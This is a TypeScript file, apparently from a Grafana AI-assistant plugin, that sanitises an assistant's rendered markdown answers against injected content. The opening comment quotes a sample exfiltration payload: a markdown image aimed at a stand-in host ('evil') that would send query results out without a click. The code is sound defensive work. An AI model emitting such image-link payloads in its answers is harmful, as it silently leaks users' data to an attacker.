import { renderMarkdown } from '@grafana/data';

/**
 * The answer can quote attacker-controlled text (log lines, labels, panel titles). renderMarkdown strips
 * scripts, but still allows elements that load URLs by themselves: an injected ![](https://evil/?d=<data>)
 * would leak query results without a click. Show such URLs as text, drop inline styles, and open
 * external links in a new tab so the conversation survives.
 */
export const safeHtml = (markdown: string): string => {
  const doc = new DOMParser().parseFromString(renderMarkdown(markdown), 'text/html');
  doc.body
    .querySelectorAll(
      'img,iframe,video,audio,source,picture,object,embed,form,button,link,meta,style,input:not([type=checkbox])'
    )
    .forEach((el) => el.replaceWith(el.getAttribute('src') ?? el.getAttribute('data') ?? ''));
  // Grafana's global CSS classes could position an injected link over the page, like inline styles
  doc.body.querySelectorAll('[style],[class]').forEach((el) => {
    el.removeAttribute('style');
    el.removeAttribute('class');
  });
  doc.body.querySelectorAll('a[href]').forEach((a) => {
    const href = a.getAttribute('href')!;
    // resolved against the base URL like the browser does; URL.canParse: placeholders like http://HOST:PORT/ must
    // not throw during render
    if (
      !URL.canParse(href, document.baseURI) ||
      new URL(href, document.baseURI).origin !== new URL(document.baseURI).origin
    ) {
      a.setAttribute('target', '_blank');
      a.setAttribute('rel', 'noopener noreferrer');
    }
  });
  return doc.body.innerHTML;
};
